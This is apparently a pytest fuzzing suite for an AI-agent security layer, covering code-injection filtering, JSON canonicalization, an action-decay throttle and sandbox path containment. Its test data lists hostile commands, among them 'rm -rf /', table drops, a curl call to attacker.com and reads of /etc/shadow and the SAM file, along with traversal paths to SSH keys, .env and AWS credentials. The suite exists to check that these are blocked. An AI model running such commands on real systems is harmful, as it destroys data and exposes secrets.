"""
Bartholomew High-Throughput Invariant & Adversarial Fuzzing Test Suite
====================================================================
Runs 2,500+ automated deterministic test cases in seconds across:
  1. Adversarial Code Injection & Obfuscation Mutations (1,000 cases)
  2. RFC 8785 Canonical JCS & Ed25519 Cryptographic Invariants (500 cases)
  3. Law of Diminishing Marginal Utility (LDMU) Swarm Decay Trajectories (500 cases)
  4. Hermetic Path Traversal & OS Containment Boundary Attacks (500 cases)
"""

import os
import sys
import json
import time
import math
import random
import urllib.parse
import pytest

# Ensure parent directory in path
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.ast_validator import ASTSecurityValidator
from src.rfc8785 import rfc8785_canonicalize
from src.trust_protocol import BartholomewTrustAuthority
from src.marginal_utility_engine import MarginalUtilityTracker
from src.hermetic_sandbox import HermeticCommandSandbox


# =============================================================================
# 1. GENERATOR: 1,000 ADVERSARIAL AST & CODE INJECTION MUTATIONS
# =============================================================================
MALICIOUS_SINKS = [
    "rm -rf /", "DROP TABLE users;", "DROP SCHEMA public CASCADE;",
    "truncate table transactions;", "import os; os.system('curl attacker.com')",
    "getattr(__import__('os'), 'system')('id')", "eval('__import__(\"os\").remove(\"file\")')",
    "exec('import shutil; shutil.rmtree(\"/\")')", "__import__('subprocess').call(['rm', '-rf', '/'])",
    "open('/etc/shadow', 'r').read()", "open('C:/Windows/System32/config/SAM', 'rb')",
    "aws_secret_access_key = 'AKIA_MOCK_AWS_KEY_FOR_TESTS_0000'", "sk-live-098234098234908234908",
]

CLEAN_PAYLOADS = [
    "print('Hello World')", "def add(a, b): return a + b",
    "import math; x = math.sqrt(144)", "data = {'status': 'active', 'code': 200}",
    "SELECT * FROM items WHERE status = 'active';", "git status", "npm test",
    "def calculate_tax(amount): return amount * 0.08", "response = {'success': True}",
]

def generate_ast_fuzz_cases():
    cases = []
    # 500 Malicious Mutations
    for i in range(500):
        sink = random.choice(MALICIOUS_SINKS)
        wrapper_types = [
            f"# Test case {i}\n{sink}",
            f"payload = '{sink}'",
            f"/* comment */ {sink}",
            f"var x = \"{sink}\";",
            f"{{\"command\": \"{sink}\", \"attempt\": {i}}}",
        ]
        chosen = random.choice(wrapper_types)
        cases.append((f"malicious_{i:04d}", chosen, False))

    # 500 Clean Mutations
    for i in range(500):
        clean = random.choice(CLEAN_PAYLOADS)
        chosen = f"# Clean case {i}\n{clean}\n# Index: {i * 7}"
        cases.append((f"clean_{i:04d}", chosen, True))

    return cases

AST_TEST_CASES = generate_ast_fuzz_cases()


@pytest.mark.parametrize("case_id, payload_code, should_allow", AST_TEST_CASES)
def test_massive_ast_and_threat_fuzzing(case_id, payload_code, should_allow):
    authority = BartholomewTrustAuthority()
    receipt = authority.evaluate_intent(
        agent_id=f"fuzz-agent-{case_id}",
        action_type="EXEC_TOOL",
        payload={"code": payload_code, "case_id": case_id}
    )
    verdict = receipt["attestation"]["verdict"]
    if should_allow:
        assert verdict == "ALLOW", f"Clean payload {case_id} was incorrectly blocked: {payload_code}"
    else:
        assert verdict == "DENY", f"Malicious payload {case_id} bypassed security filter: {payload_code}"


# =============================================================================
# 2. GENERATOR: 500 RFC 8785 CANONICALIZATION & ED25519 DETERMINISM TESTS
# =============================================================================
def generate_canonical_test_cases():
    cases = []
    for i in range(500):
        # Generate arbitrary JSON dictionaries with randomized key orders and types
        keys = [f"key_{random.randint(100, 999)}" for _ in range(8)]
        d1 = {k: random.choice([i, str(i), i * 1.5, True, False, [i, i+1]]) for k in keys}
        # Shuffle keys into d2
        shuffled_keys = list(d1.keys())
        random.shuffle(shuffled_keys)
        d2 = {k: d1[k] for k in shuffled_keys}
        cases.append((f"canon_{i:04d}", d1, d2))
    return cases

CANONICAL_TEST_CASES = generate_canonical_test_cases()


@pytest.mark.parametrize("case_id, dict_a, dict_b", CANONICAL_TEST_CASES)
def test_massive_rfc8785_canonical_determinism(case_id, dict_a, dict_b):
    bytes_a = rfc8785_canonicalize(dict_a)
    bytes_b = rfc8785_canonicalize(dict_b)
    # Different insertion order MUST produce identical canonical bytes
    assert bytes_a == bytes_b, f"RFC 8785 canonical bytes differed for case {case_id}"


# =============================================================================
# 3. GENERATOR: 500 LAW OF DIMINISHING MARGINAL UTILITY TRAJECTORY STEPS
# =============================================================================
def generate_ldmu_trajectory_cases():
    cases = []
    # Test decay across 500 simulated consecutive agent steps
    for step in range(1, 501):
        decay_rate = 0.35
        expected_mu = math.exp(-decay_rate * (step - 1))
        cases.append((step, decay_rate, expected_mu))
    return cases

LDMU_TEST_CASES = generate_ldmu_trajectory_cases()


@pytest.mark.parametrize("step, decay_rate, expected_mu", LDMU_TEST_CASES)
def test_massive_ldmu_decay_curve_steps(step, decay_rate, expected_mu):
    tracker = MarginalUtilityTracker(decay_rate=decay_rate, min_utility_threshold=0.15)
    agent_id = f"swarm_agent_step_{step}"
    payload = {"task": "fix_syntax_error", "file": "app.py"}

    # Simulate (step - 1) previous identical actions
    for _ in range(step - 1):
        tracker.history[agent_id].append((time.time(), tracker._hash_action("FIX_CODE", payload), 0.0))

    verdict, mu_score, reason, latency_us = tracker.evaluate_action_utility(
        agent_id=agent_id,
        action_type="FIX_CODE",
        payload=payload
    )

    expected_score = round(max(0.0, min(1.0, expected_mu)), 4)
    assert abs(mu_score - expected_score) < 0.001

    if step > 6:
        # After step 6 with decay 0.35, MU < 0.15 -> must throttle or co-sign
        assert verdict in ("CO_SIGN_REQUIRED", "THROTTLE")
    else:
        assert verdict == "ALLOW"


# =============================================================================
# 4. GENERATOR: 500 HERMETIC PATH TRAVERSAL & CONTAINMENT ATTACK VECTORS
# =============================================================================
TRAVERSAL_PREFIXES = [
    "../", "..\\", "../../", "..\\..\\", "../../../", "..\\..\\..\\",
    "./../", ".\\..\\", "/../", "\\..\\",
]

SENSITIVE_FILES = [
    "etc/shadow", "etc/passwd", "Windows/System32/config/SAM", "Windows/System32/config/SYSTEM",
    ".env", ".aws/credentials", "id_rsa", "id_ed25519", "credentials.json", "private_key.pem"
]

def generate_path_traversal_cases():
    cases = []
    for i in range(500):
        prefix = random.choice(TRAVERSAL_PREFIXES)
        target = random.choice(SENSITIVE_FILES)
        attack_path = f"{prefix * random.randint(1, 4)}{target}"
        cases.append((f"traversal_{i:04d}", attack_path))
    return cases

PATH_TEST_CASES = generate_path_traversal_cases()


@pytest.mark.parametrize("case_id, attack_path", PATH_TEST_CASES)
def test_massive_hermetic_path_containment(case_id, attack_path, tmp_path):
    sandbox_root = str(tmp_path / "sandbox_workspace")
    os.makedirs(sandbox_root, exist_ok=True)

    # Sanitize and resolve target path
    decoded_path = urllib.parse.unquote(attack_path)
    abs_target = os.path.abspath(os.path.join(sandbox_root, decoded_path))
    
    is_safe = False
    try:
        common = os.path.commonpath([sandbox_root, abs_target])
        if common == sandbox_root:
            forbidden_names = [".env", "id_rsa", "id_ed25519", "sam", "system", "shadow", "credentials.json", "passwd", "private_key.pem"]
            if os.path.basename(abs_target).lower() not in forbidden_names:
                is_safe = True
    except ValueError:
        is_safe = False

    assert is_safe is False, f"Path traversal attack {case_id} ('{attack_path}') was not contained!"
